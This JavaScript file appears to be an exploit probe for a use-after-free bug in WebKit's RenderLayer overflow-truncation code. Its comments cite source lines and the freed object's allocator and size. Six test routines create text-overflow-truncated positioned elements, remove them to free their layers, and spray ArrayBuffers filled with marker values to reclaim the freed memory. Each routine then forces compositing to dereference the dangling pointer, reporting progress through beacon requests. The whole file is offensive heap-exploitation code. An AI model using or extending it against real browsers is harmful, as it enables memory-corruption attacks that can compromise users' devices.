// p225 — Bug 287908: content-visibility / overflow truncation UAF
//
// RenderLayer.h:1355 — setIsHiddenByOverflowTruncation sets
// m_visibleContentStatusDirty = true directly WITHOUT calling
// dirtyAncestorChainVisibleDescendantStatus(). When a truncated
// child's layer is destroyed, the parent's z-order list retains
// a dangling pointer to the freed RenderLayer.
//
// RenderLayerCompositor.cpp:1188-1214 — computeCompositingRequirements
// iterates negativeZOrderLayers/normalFlowLayers/positiveZOrderLayers
// which may contain the freed pointer.
//
// RenderLayer is FastMalloc-allocated (~600-1000 bytes) — ArrayBuffer
// spray CAN reclaim this directly (same allocator, no GC).
//
// Trigger: LayoutIntegrationLineLayout.cpp:643
//   layer->setIsHiddenByOverflowTruncation(box.isFullyTruncated())
//
// Beacon prefix: V225-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V225-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // ---- TEST A: Basic overflow truncation → remove → compositing update ----
  try {
    BS('A-START');

    // Create container with text-overflow: ellipsis
    var container = document.createElement('div');
    container.style.cssText = 'width:50px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;';
    document.body.appendChild(container);

    // Add text before the target to push it into truncation zone
    var filler = document.createTextNode('AAAAAAAAAAAAAAAA');
    container.appendChild(filler);

    // Create inline-block child with its own RenderLayer
    // position:relative creates a stacking context → has a RenderLayer
    var child = document.createElement('span');
    child.style.cssText = 'display:inline-block;position:relative;z-index:1;width:40px;height:20px;background:red;opacity:0.99;';
    child.textContent = 'X';
    container.appendChild(child);

    // Force layout so the child gets truncated
    document.body.offsetHeight;
    BS('A-LAYOUT1');

    // Check if child is actually truncated (offsetLeft > container width)
    var childLeft = child.offsetLeft;
    var containerWidth = container.offsetWidth;
    BS('A-POS-' + childLeft + '-W-' + containerWidth);

    // The child should now be fully truncated
    // setIsHiddenByOverflowTruncation(true) was called
    // m_visibleContentStatusDirty = true but NO ancestor propagation

    // Now remove the child — its RenderLayer gets freed
    container.removeChild(child);
    BS('A-REMOVED');

    // The parent layer's z-order list still has the dangling pointer
    // because dirtyAncestorChainVisibleDescendantStatus was never called

    // Force compositing update — this iterates z-order lists
    // Add a composited layer to trigger computeCompositingRequirements
    var compositor = document.createElement('div');
    compositor.style.cssText = 'position:absolute;top:0;left:0;width:1px;height:1px;transform:translateZ(0);will-change:transform;';
    container.appendChild(compositor);

    // Force layout + compositing
    document.body.offsetHeight;
    BS('A-COMPOSITING');

    // If we get here, the freed pointer wasn't dereferenced
    // or the timing wasn't right
    BS('A-SURVIVED');

    document.body.removeChild(container);
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Multiple truncated children + forced style recalc ----
  try {
    BS('B-START');

    var box = document.createElement('div');
    box.style.cssText = 'width:30px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;';
    document.body.appendChild(box);

    // Create several inline-block children with layers
    var children = [];
    for (var i = 0; i < 8; i++) {
      var sp = document.createElement('span');
      sp.style.cssText = 'display:inline-block;position:relative;z-index:' + (i + 1) + ';width:30px;height:15px;opacity:0.5;';
      sp.textContent = 'N' + i;
      box.appendChild(sp);
      children.push(sp);
    }

    // Force layout — children beyond first are fully truncated
    document.body.offsetHeight;
    BS('B-LAYOUT');

    // Remove truncated children (keep first one which might be visible)
    for (var i = 7; i >= 2; i--) {
      box.removeChild(children[i]);
    }
    BS('B-REMOVED-6');

    // Don't force layout yet — let dirty state accumulate

    // Now force a complex style recalc + compositing
    box.style.transform = 'translateZ(0)';
    box.style.willChange = 'transform';

    // Add new positioned children to force z-order list rebuild
    for (var j = 0; j < 4; j++) {
      var nsp = document.createElement('span');
      nsp.style.cssText = 'display:inline-block;position:relative;z-index:-1;width:10px;height:10px;';
      nsp.textContent = 'R';
      box.appendChild(nsp);
    }

    // NOW force layout
    document.body.offsetHeight;
    BS('B-COMPOSITING');

    // If we survive, check if the negative z-index children created issues
    BS('B-SURVIVED');
    document.body.removeChild(box);
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: Async remove + requestAnimationFrame ----
  // Use rAF to separate the truncation from the removal
  try {
    BS('C-START');

    var c3 = document.createElement('div');
    c3.style.cssText = 'width:40px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;';
    document.body.appendChild(c3);

    // Long text to ensure truncation
    c3.appendChild(document.createTextNode('ZZZZZZZZZZZZZZZZZZZZZ'));

    var targets = [];
    for (var i = 0; i < 5; i++) {
      var el = document.createElement('span');
      el.style.cssText = 'display:inline-block;position:relative;z-index:' + (i + 1) + ';width:20px;height:10px;opacity:0.8;';
      el.textContent = 'T';
      c3.appendChild(el);
      targets.push(el);
    }

    // Force layout — truncation happens
    document.body.offsetHeight;
    BS('C-TRUNCATED');

    // Use setTimeout to separate operations across microtask boundaries
    setTimeout(function() {
      // Remove truncated children
      for (var i = targets.length - 1; i >= 0; i--) {
        if (targets[i].parentNode) targets[i].parentNode.removeChild(targets[i]);
      }
      BS('C-REMOVED');

      // Spray to reclaim freed RenderLayer memory (~768 byte size class)
      var spray = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(768);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) {
          view[k] = 0xDEAD0000 | (k & 0xFFFF);
        }
        spray.push(ab);
      }
      BS('C-SPRAYED-' + spray.length);

      // NOW force compositing — should hit freed memory
      requestAnimationFrame(function() {
        c3.style.transform = 'translateZ(0)';
        c3.style.willChange = 'transform';
        document.body.offsetHeight;
        BS('C-RAF-LAYOUT');

        // If we crash here, the freed RenderLayer was dereferenced
        // If we survive, the z-order list was already cleaned up
        BS('C-SURVIVED');
        document.body.removeChild(c3);
        spray = null;
      });
    }, 0);
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST D: content-visibility: auto cycle ----
  // Toggle content-visibility to trigger visibility status changes
  try {
    BS('D-START');

    var d = document.createElement('div');
    d.style.cssText = 'position:relative;width:100px;height:100px;';
    document.body.appendChild(d);

    // Create several layers
    var dChildren = [];
    for (var i = 0; i < 10; i++) {
      var el = document.createElement('div');
      el.style.cssText = 'position:absolute;top:' + (i * 8) + 'px;left:0;width:50px;height:6px;z-index:' + i + ';opacity:0.9;background:blue;';
      d.appendChild(el);
      dChildren.push(el);
    }

    document.body.offsetHeight;
    BS('D-LAYOUT');

    // Check if content-visibility is supported
    var supportsCV = CSS.supports && CSS.supports('content-visibility', 'auto');
    BS('D-CV-SUPPORT-' + supportsCV);

    if (supportsCV) {
      // Set content-visibility: hidden → all children become non-visible
      d.style.contentVisibility = 'hidden';
      document.body.offsetHeight;
      BS('D-HIDDEN');

      // Remove children while hidden
      for (var i = dChildren.length - 1; i >= 3; i--) {
        d.removeChild(dChildren[i]);
      }
      BS('D-REMOVED-7');

      // Spray
      var dSpray = [];
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(768);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) view[k] = 0xCAFE0000 | k;
        dSpray.push(ab);
      }

      // Switch back to visible — forces compositing requirements recompute
      d.style.contentVisibility = 'visible';
      document.body.offsetHeight;
      BS('D-VISIBLE');
      BS('D-SURVIVED');
    } else {
      BS('D-SKIP-NO-CV');
    }

    document.body.removeChild(d);
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST E: Overflow truncation + animation frame spray ----
  // Most precise trigger: exactly reproduce the vulnerable path
  try {
    BS('E-START');

    var e5 = document.createElement('div');
    e5.style.cssText = 'width:1px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;font-size:16px;line-height:20px;';
    document.body.appendChild(e5);

    // Create an atomic inline that WILL be fully truncated
    // (container is 1px wide — everything is truncated)
    var atom = document.createElement('span');
    atom.style.cssText = 'display:inline-block;position:relative;z-index:5;width:100px;height:20px;opacity:0.7;';
    atom.textContent = 'PAYLOAD';
    e5.appendChild(atom);

    // Force layout — LayoutIntegrationLineLayout::updateInlineBoxDimensions
    // calls setIsHiddenByOverflowTruncation(true) for the fully truncated atom
    var forceLayout = document.body.offsetHeight;
    BS('E-TRUNCATED');

    // Verify truncation
    var rect = atom.getBoundingClientRect();
    BS('E-RECT-W' + Math.round(rect.width) + '-L' + Math.round(rect.left));

    // Remove the truncated element — its RenderLayer is freed via FastMalloc
    // But parent's z-order dirty status was NOT propagated to ancestors
    e5.removeChild(atom);
    atom = null;
    BS('E-FREED');

    // Spray ArrayBuffers to reclaim the freed RenderLayer
    // RenderLayer is ~600-1000 bytes, try multiple size classes
    var eSpray = [];
    var sizes = [512, 640, 768, 896, 1024];
    for (var si = 0; si < sizes.length; si++) {
      for (var s = 0; s < 200; s++) {
        var ab = new ArrayBuffer(sizes[si]);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) {
          view[k] = 0xBEEF0000 | ((si << 12) | (k & 0xFFF));
        }
        eSpray.push(ab);
      }
    }
    BS('E-SPRAYED-' + eSpray.length);

    // Force compositing update — this should iterate the stale z-order list
    // which still has the dangling RenderLayer pointer
    e5.style.transform = 'translateZ(0)';
    e5.style.willChange = 'transform';

    // Add negative z-index child to force negativeZOrderLayers iteration
    var neg = document.createElement('div');
    neg.style.cssText = 'position:absolute;z-index:-1;width:1px;height:1px;';
    e5.appendChild(neg);

    document.body.offsetHeight;
    BS('E-COMPOSITING');

    // If we get here without crash, either:
    // 1. The z-order list was rebuilt before we hit it (WebKit rebuilt on child remove)
    // 2. The freed memory wasn't reclaimed by our spray
    // 3. The bug isn't triggerable this way
    BS('E-SURVIVED');

    document.body.removeChild(e5);
    eSpray = null;
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST F: ResizeObserver + overflow truncation timing ----
  try {
    BS('F-START');

    var f6 = document.createElement('div');
    f6.id = 'f6container';
    f6.style.cssText = 'width:200px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;';
    document.body.appendChild(f6);

    f6.appendChild(document.createTextNode('Some text here '));

    var fAtom = document.createElement('span');
    fAtom.style.cssText = 'display:inline-block;position:relative;z-index:3;width:50px;height:20px;opacity:0.6;';
    fAtom.textContent = 'ATOM';
    f6.appendChild(fAtom);

    document.body.offsetHeight;
    BS('F-VISIBLE');

    // Use ResizeObserver to shrink container → triggers truncation
    var ro = new ResizeObserver(function(entries) {
      BS('F-RESIZE-CB');

      // Inside the resize callback, the child should now be truncated
      // Remove it to free its RenderLayer
      if (fAtom.parentNode) {
        fAtom.parentNode.removeChild(fAtom);
        BS('F-REMOVED-IN-RO');
      }
    });
    ro.observe(f6);

    // Shrink container to trigger truncation + ResizeObserver
    f6.style.width = '1px';
    BS('F-SHRUNK');

    // Force several layout passes
    for (var pass = 0; pass < 3; pass++) {
      document.body.offsetHeight;
    }
    BS('F-LAYOUTS');

    // Wait for RO callback then check
    setTimeout(function() {
      BS('F-TIMEOUT');

      // Spray
      var fSpray = [];
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(768);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) view[k] = 0xFACE0000 | k;
        fSpray.push(ab);
      }
      BS('F-SPRAYED');

      // Force compositing
      f6.style.transform = 'translateZ(0)';
      document.body.offsetHeight;
      BS('F-FINAL-LAYOUT');
      BS('F-SURVIVED');

      document.body.removeChild(f6);
      fSpray = null;
      ro.disconnect();
    }, 50);
  } catch (e) {
    BS('F-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
